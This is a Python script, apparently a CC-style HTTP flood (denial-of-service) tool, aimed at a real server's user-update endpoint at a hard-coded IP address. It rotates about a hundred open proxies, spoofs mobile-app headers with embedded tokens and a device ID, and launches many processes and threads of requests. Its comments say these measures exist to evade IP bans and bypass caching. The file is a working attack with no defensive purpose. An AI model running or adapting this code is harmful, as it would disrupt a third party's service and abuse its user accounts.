import sys
sys.path.append('C:\ProxyPool\WebApi')
from apis import get_proxy


from multiprocessing import Pool as ProcessPool
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Process
import requests
import random
import redis
from urllib.parse import quote

class AttackTT:
    def __init__(self):
        self.url = 'http://123.206.219.117/peipeiuser/user/update?character_autograph={}'
        # self.url = 'http://127.0.0.1:24422'
        self.jobs = 100
        self.processnum = 20
        self.threadnum = 8
        self.method = 'post'
        self.post = None
        self.proxies_list = ['39.137.69.9:8080', '120.52.73.1:8080', '101.96.11.4:80', '115.204.28.162:6666', '123.232.119.125:80', '222.89.85.158:8060', '140.205.222.3:80', '115.198.38.179:6666', '121.8.98.198:80', '117.127.0.208:80', '183.56.177.130:808', '171.10.31.73:8080', '119.165.188.137:8197', '39.137.69.6:80', '119.28.152.208:80', '112.73.6.40:3128', '101.96.10.4:80', '117.127.0.210:80', '114.250.29.45:9090', '221.228.17.172:8181', '171.10.31.74:80', '39.137.77.66:80', '171.10.31.74:8080', '101.248.64.66:8080', '166.111.80.162:3128', '61.185.137.126:3128', '171.10.31.73:80', '117.80.65.185:3128', '114.226.135.52:6666', '124.133.230.254:80', '101.53.101.172:9999', '140.143.96.216:80', '211.75.82.206:3128', '202.38.92.100:3128', '120.52.73.1:96', '112.74.207.50:3128', '122.112.2.9:80', '120.52.73.1:8095', '59.44.16.6:8000', '117.127.0.195:80', '42.200.167.219:3128', '39.137.77.68:80', '120.77.254.116:3128', '101.248.64.66:80', '54.222.177.145:3128', '218.93.207.26:8088', '117.127.0.209:80', '117.127.0.197:80', '111.62.243.64:8080', '222.85.31.177:8060', '118.26.164.5:80', '60.205.205.48:80', '115.198.38.58:6666', '119.39.48.205:9090', '118.212.137.135:31288', '222.88.149.32:8060', '123.57.76.102:80', '183.2.212.2:3128', '39.137.69.7:8080', '117.127.0.205:8080', '222.185.23.139:6666', '42.123.127.1:3128', '124.118.31.104:8060', '183.179.199.225:8080', '171.217.92.33:9090', '120.52.73.1:80', '117.127.0.205:80', '113.200.56.13:8010', '58.247.46.123:8088', '39.137.69.7:80', '124.238.235.135:8000', '221.7.255.168:80', '39.137.69.9:80', '103.242.219.243:8080', '121.8.98.197:80', '111.62.243.64:80', '59.44.16.6:80', '121.58.17.52:80', '202.100.83.139:80', '121.40.108.76:80', '61.136.163.245:3128', '117.127.0.204:8080', '119.28.50.37:82', '39.137.69.8:80', '139.159.254.232:3128', '117.127.0.196:80', '101.96.10.5:80', '124.207.178.174:9090', '61.183.172.164:9090', '180.101.205.253:8888', '58.250.82.121:9090', '121.8.98.196:80', '119.27.177.169:80', '101.4.136.34:80', '120.79.133.212:8088', '39.134.14.66:8080', '61.136.163.244:8103', '60.176.234.137:6666', '218.59.139.238:80', '121.231.155.32:6666', '121.17.18.219:8060', '39.137.77.67:80', '103.235.245.35:8080', '39.137.69.10:80']

        with open('C:/Users\Administrator\Desktop/books/白伏诡话.txt', 'r') as fl:
            content = fl.readlines()
        fl.close()
        self.url_content = [quote(i) for i in content]

    def cc_website(self, jobs):
        # theader = {}
        #生成http头部，防止封杀IP
        headers = uti.make_headers()
        tmp_proxy = random.choice(self.proxies_list)
        data_post = {}
        if self.method.upper == 'POST':
            data_post = uti.make_post_params(self.post)
        while jobs > 0:
        #生成随机参数，防止缓存
            if self.method.upper() == 'POST':
                try:
                    response = requests.post(self.url.format(random.choice(self.url_content)), headers=headers, proxies={'http':'http://{}'.format(tmp_proxy)} ,data=data_post ,timeout=20)
                    if response.status_code == 200:
                        print ('Attack website {} success with proxy {}, got result {}'.format(self.url, tmp_proxy, response.json()))
                        # print ('Use proxy %s success' % (proxy.strip()))
                except Exception as e:
                    print('Attack failed with error:{}'.format(e.args))
            elif self.method.upper() == 'GET':
                try:
                    rand_int = random.randint(0,6)
                    response = requests.get(self.url.format(rand_int), headers= headers, proxies = {'http':'http://{}'.format(tmp_proxy)} ,timeout = 20)
                    if response.status_code == 200:
                        print ('Attack website {} success with proxy {}, got result {}'.format(self.url, tmp_proxy, response.json()))
                        # print ('Use proxy %s success' % (proxy.strip()))
                except Exception as e:
                    print('Attack failed with error:{}'.format(e.args))
            jobs -= 1

    '''
    cc主函数-新建测试线程
    '''
    def mk_threading(self, jobs, threadnum):

        threadsPool = ThreadPool(threadnum)
        try:
            result = threadsPool.map(self.cc_website, [100]*jobs) #关键操作
            threadsPool.close()
            threadsPool.join()
        except Exception as e:
            print(e)

    '''
    cc主函数-新建测试进程
    '''
    def mk_process(self,jobs, processnum, threadnum):
        Processpools = ProcessPool(processnum)
        for i in range(processnum):
            Processpools.apply_async(self.mk_threading, args=(jobs, threadnum))
        print ('CC start...')
        print ('Waiting for all subprocesses done...')
        Processpools.close()
        Processpools.join()
        print ('All subprocesses done.')

    '''
    cc主函数
    '''
    def attack_cc(self):
        jobs = 1000
        processnum = 50
        threadnum = 8
        self.mk_process(jobs, processnum, threadnum)

class Utils:
    def __init__(self):
        self.t = '1170f864930b85834f2aa482cd1eb447df4d'
        self.t1 = '3506d1ed0f339578405291ca088d15f5e81d'
        self.k = 'be3d8184176377538b026f9231added9'
        self.driveid = '868453026613028'

    def make_headers(self):
        headers = {'User-Agent': 'okhttp/3.8.1',
                    'Accept-Encoding': 'gzip',
                    'Connection': 'Keep-Alive',
                    'host': '123.206.219.117',
                    'k':self.k,
                    'h':'01200156fm_0001',
                    't':self.t,
                    't1':self.t1,
                    'driveid':self.driveid,
                    'cpsUsername':'fm_0001',
                    'view': 'UserInfoActivity',
                   'Content-Length': '0'
                   }
        return headers

    def make_data(self, length):
        str_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        return ''.join([random.choice(str_list) for i in range(length)])

    def make_post_params(self, *args):
        print(1)
        return {}
    def getImei(self):
        num = '86'
        suma = 0
        for i in range(0, 11):
            digit = random.randrange(0, 9)
            suma = suma + digit
            num = num + str(digit)
        suma = suma * 9
        digit = suma % 10
        num = num + str(digit)
        return num

if __name__ == '__main__':
    atc = AttackTT()
    uti = Utils()
    # atc.attack_cc()
    header = uti.make_headers()
    print(requests.post('http://123.206.219.117/peipeiuser/user/update?character_autograph=123',
                        proxies={'http':'http://192.168.2.100:8081'},

                        ).json())
    # atc.cc_website(11)
else:
    atc = AttackTT()
    uti = Utils()
